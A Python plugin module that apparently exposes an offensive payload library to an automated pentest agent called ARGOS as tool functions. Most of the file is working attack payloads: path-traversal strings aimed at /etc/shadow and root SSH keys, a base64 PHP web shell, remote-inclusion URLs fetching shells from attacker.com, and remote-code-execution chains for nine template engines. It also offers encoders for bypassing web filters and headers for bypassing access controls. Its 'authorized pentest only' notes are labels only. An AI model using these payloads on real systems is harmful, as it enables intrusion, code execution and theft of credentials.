"""
ARGOS Plugin: HackTools Payload Extension
LasCC/HackTools browser extension payload library — offline access to:
  LFI/RFI, SSTI, advanced XSS, reverse shell cheatsheet, encoders.

Complements existing offensive_payloads.py (XSS/SQLi/CMDi/XXE) and
reverse_shells.py with categories not yet covered:
  - Local/Remote File Inclusion (LFI/RFI)
  - Server-Side Template Injection (SSTI) — Jinja2/Twig/Freemarker/Pebble
  - Payload encoders (URL, Base64, HTML entities, Unicode)
  - Pentest cheatsheets (headers, HTTP methods, status codes)

Repo: https://github.com/LasCC/HackTools
"""
from __future__ import annotations
import subprocess, json, re
from pathlib import Path

MANIFEST = {
    "id":          "hacktools",
    "name":        "HackTools Payload Extension (LFI/SSTI/Encoders)",
    "description": "LFI/RFI, SSTI injection, payload encoders, pentest cheatsheets from LasCC/HackTools.",
    "version":     "1.0.0",
    "author":      "ARGOS",
    "requires":    [],
}

_TOOLS_BASE   = Path("/opt/argos/tools")
_HACKTOOLS_DIR = _TOOLS_BASE / "HackTools"


def _clone_hacktools() -> bool:
    if _HACKTOOLS_DIR.exists():
        return True
    _TOOLS_BASE.mkdir(parents=True, exist_ok=True)
    r = subprocess.run(
        ["git", "clone", "--depth=1", "-q",
         "https://github.com/LasCC/HackTools.git", str(_HACKTOOLS_DIR)],
        capture_output=True, timeout=120
    )
    return r.returncode == 0


# ─── Built-in payload data ────────────────────────────────────────────────────

_LFI_PAYLOADS = [
    # Basic traversal
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    # Null byte (PHP < 5.3.4)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    # URL encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # Double encoding
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Windows paths
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
    # /proc
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    # Common targets
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/nginx/nginx.conf",
    "/etc/apache2/apache2.conf",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/root/.ssh/id_rsa",
    "/root/.bash_history",
]

_RFI_PAYLOADS = [
    "http://attacker.com/shell.txt",
    "http://attacker.com/shell.txt?",
    "http://attacker.com/shell.txt%00",
    "https://attacker.com/shell.php",
    "\\\\attacker.com\\share\\shell.php",
    "ftp://attacker.com/shell.txt",
]

_SSTI_PAYLOADS = {
    "detection": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "{{7*'7'}}",
        "${7*'7'}",
    ],
    "jinja2": [
        "{{7*7}}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__base__.__subclasses__()}}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{%endif%}{%endfor%}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
    ],
    "twig": [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{['cat /etc/passwd']|filter('passthru')}}",
        "{{_self.env.setCache(\"ftp://attacker.com:21\")|_self.env.loadTemplate(\"backdoor\")}}",
    ],
    "freemarker": [
        "${7*7}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}",
    ],
    "pebble": [
        "{{7*7}}",
        "{{'a'.toUpperCase()}}",
        "{{ variable.getClass() }}",
        "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(' ')) %}",
    ],
    "velocity": [
        "#set($a = 7*7)$a",
        "#set($str=$class.inspect('java.lang.String').type)#set($chr=$class.inspect('java.lang.Character').type)#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    "mako": [
        "${7*7}",
        "${__import__('os').popen('id').read()}",
        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
    ],
    "smarty": [
        "{$smarty.version}",
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    ],
    "erb": [
        "<%= 7*7 %>",
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= IO.popen('id').readlines() %>",
    ],
}

_ENCODERS = {
    "url_encode_all": lambda s: "".join(f"%{ord(c):02X}" for c in s),
    "html_entities":  lambda s: "".join(f"&#{ord(c)};" for c in s),
    "html_hex":       lambda s: "".join(f"&#x{ord(c):02X};" for c in s),
    "unicode_escape": lambda s: "".join(f"\\u{ord(c):04X}" for c in s),
    "base64":         lambda s: __import__("base64").b64encode(s.encode()).decode(),
    "hex":            lambda s: s.encode().hex(),
    "rot13":          lambda s: s.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
    )),
}

_HTTP_HEADERS_CHEATSHEET = {
    "security_headers": {
        "Content-Security-Policy":            "default-src 'self'; script-src 'self'",
        "X-Content-Type-Options":             "nosniff",
        "X-Frame-Options":                    "DENY",
        "X-XSS-Protection":                   "1; mode=block",
        "Strict-Transport-Security":          "max-age=31536000; includeSubDomains; preload",
        "Referrer-Policy":                    "strict-origin-when-cross-origin",
        "Permissions-Policy":                 "geolocation=(), camera=(), microphone=()",
        "Cache-Control":                      "no-store, no-cache, must-revalidate",
    },
    "bypass_headers": {
        "X-Forwarded-For":                    "127.0.0.1",
        "X-Real-IP":                          "127.0.0.1",
        "X-Originating-IP":                   "127.0.0.1",
        "X-Remote-IP":                        "127.0.0.1",
        "X-Client-IP":                        "127.0.0.1",
        "X-Host":                             "localhost",
        "X-Forwarded-Host":                   "localhost",
        "X-Custom-IP-Authorization":          "127.0.0.1",
        "X-Original-URL":                     "/admin",
        "X-Rewrite-URL":                      "/admin",
    },
    "info_disclosure": [
        "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
        "Via", "X-Backend-Server", "X-Cache", "X-Generator",
    ],
}


# ─── Tool functions ───────────────────────────────────────────────────────────

def hacktools_lfi_payloads(target_param: str = "file",
                            include_rfi: bool = True,
                            include_wrappers: bool = True) -> dict:
    """Get LFI/RFI payload list for file inclusion vulnerability testing.
    ⚠️  AUTHORIZED PENETRATION TESTING ONLY.

    target_param:      URL parameter name to inject into (for example URLs)
    include_rfi:       include Remote File Inclusion payloads
    include_wrappers:  include PHP wrapper payloads (php://filter, data://)
    """
    payloads = list(_LFI_PAYLOADS)
    if not include_wrappers:
        payloads = [p for p in payloads if not p.startswith("php://") and not p.startswith("data://")]

    result = {
        "type":          "LFI/RFI",
        "param":         target_param,
        "lfi_count":     len(payloads),
        "lfi_payloads":  payloads,
        "example_urls":  [
            f"http://target.com/page.php?{target_param}={p}"
            for p in payloads[:5]
        ],
        "note":          "AUTHORIZED PENETRATION TESTING ONLY",
        "source":        "HackTools + ARGOS extended LFI library",
    }

    if include_rfi:
        result["rfi_payloads"] = _RFI_PAYLOADS
        result["rfi_count"]    = len(_RFI_PAYLOADS)
        result["rfi_note"]     = "Replace attacker.com with your server IP — requires allow_url_include=On in PHP"

    return result


def hacktools_ssti_payloads(engine: str = "all",
                              rce_only: bool = False) -> dict:
    """Get SSTI (Server-Side Template Injection) payloads for various engines.
    ⚠️  AUTHORIZED PENETRATION TESTING ONLY.

    engine:   'all' | 'jinja2' | 'twig' | 'freemarker' | 'pebble' |
              'velocity' | 'mako' | 'smarty' | 'erb' | 'detection'
    rce_only: only return payloads that achieve RCE (skip detection)
    """
    if engine == "all":
        engines = _SSTI_PAYLOADS
    elif engine in _SSTI_PAYLOADS:
        engines = {engine: _SSTI_PAYLOADS[engine]}
    else:
        return {
            "error":    f"Unknown engine: {engine}",
            "available": list(_SSTI_PAYLOADS.keys()),
        }

    result = {}
    for eng, payloads in engines.items():
        if rce_only and eng == "detection":
            continue
        result[eng] = payloads

    return {
        "type":          "SSTI",
        "engine":        engine,
        "payloads":      result,
        "total":         sum(len(v) for v in result.values()),
        "detection_tip": "Start with {{7*7}} — if you get 49, it's likely Jinja2/Twig. ${7*7}=49 → Freemarker/Mako.",
        "note":          "AUTHORIZED PENETRATION TESTING ONLY",
        "source":        "HackTools + ARGOS extended SSTI library",
    }


def hacktools_encode(text: str, method: str = "url") -> dict:
    """Encode a string using various techniques for WAF bypass / payload delivery.

    text:   string to encode
    method: 'url' | 'url_all' | 'html' | 'html_hex' | 'unicode' |
            'base64' | 'hex' | 'rot13' | 'all'
    """
    method_map = {
        "url":      lambda s: __import__("urllib.parse", fromlist=["quote"]).quote(s),
        "url_all":  _ENCODERS["url_encode_all"],
        "html":     _ENCODERS["html_entities"],
        "html_hex": _ENCODERS["html_hex"],
        "unicode":  _ENCODERS["unicode_escape"],
        "base64":   _ENCODERS["base64"],
        "hex":      _ENCODERS["hex"],
        "rot13":    _ENCODERS["rot13"],
    }

    if method == "all":
        return {
            "input":    text,
            "encodings": {k: fn(text) for k, fn in method_map.items()},
            "source":   "HackTools encoder",
        }

    fn = method_map.get(method)
    if not fn:
        return {"error": f"Unknown method: {method}", "available": list(method_map.keys())}

    return {
        "input":   text,
        "method":  method,
        "encoded": fn(text),
        "source":  "HackTools encoder",
    }


def hacktools_headers_cheatsheet(category: str = "all") -> dict:
    """Get HTTP security headers cheatsheet for web pentest and hardening.

    category: 'security' | 'bypass' | 'disclosure' | 'all'
    """
    if category == "security":
        return {"category": "security_headers", "headers": _HTTP_HEADERS_CHEATSHEET["security_headers"]}
    if category == "bypass":
        return {"category": "bypass_headers", "headers": _HTTP_HEADERS_CHEATSHEET["bypass_headers"],
                "usage": "Add these headers to requests to bypass IP-based restrictions"}
    if category == "disclosure":
        return {"category": "info_disclosure", "headers": _HTTP_HEADERS_CHEATSHEET["info_disclosure"],
                "usage": "Check response for these headers — presence reveals tech stack"}
    return {
        "source":   "HackTools + ARGOS",
        **_HTTP_HEADERS_CHEATSHEET
    }


TOOLS = {
    "hacktools_lfi_payloads": {
        "fn": hacktools_lfi_payloads,
        "description": (
            "LFI/RFI payload library: path traversal, PHP wrappers (php://filter/data://), "
            "/proc/self/environ, common file targets (/etc/passwd, logs, SSH keys). "
            "⚠️ AUTHORIZED PENTEST ONLY."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "target_param":     {"type": "string",  "description": "URL parameter name to inject into (default: 'file')"},
                "include_rfi":      {"type": "boolean", "description": "Include RFI payloads (default: true)"},
                "include_wrappers": {"type": "boolean", "description": "Include PHP wrapper payloads (default: true)"},
            },
            "required": []
        }
    },
    "hacktools_ssti_payloads": {
        "fn": hacktools_ssti_payloads,
        "description": (
            "SSTI payload library for template injection testing: Jinja2, Twig, Freemarker, "
            "Pebble, Velocity, Mako, Smarty, ERB. Detection probes + RCE chains. "
            "⚠️ AUTHORIZED PENTEST ONLY."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "engine":   {"type": "string",  "description": "'all' | 'detection' | 'jinja2' | 'twig' | 'freemarker' | 'pebble' | 'velocity' | 'mako' | 'smarty' | 'erb'"},
                "rce_only": {"type": "boolean", "description": "Return only RCE payloads (skip detection probes)"},
            },
            "required": []
        }
    },
    "hacktools_encode": {
        "fn": hacktools_encode,
        "description": (
            "Encode a string for WAF bypass or payload delivery: "
            "URL, URL-all, HTML entities, HTML hex, Unicode, Base64, Hex, ROT13. "
            "Use 'all' to get all encodings at once."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "text":   {"type": "string", "description": "String to encode"},
                "method": {"type": "string", "description": "'url' | 'url_all' | 'html' | 'html_hex' | 'unicode' | 'base64' | 'hex' | 'rot13' | 'all'"},
            },
            "required": ["text"]
        }
    },
    "hacktools_headers_cheatsheet": {
        "fn": hacktools_headers_cheatsheet,
        "description": (
            "HTTP headers cheatsheet: security headers for hardening, "
            "bypass headers (X-Forwarded-For, X-Original-URL) for access control bypass, "
            "info disclosure headers that reveal tech stack."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "category": {"type": "string", "description": "'all' | 'security' | 'bypass' | 'disclosure'"},
            },
            "required": []
        }
    },
}
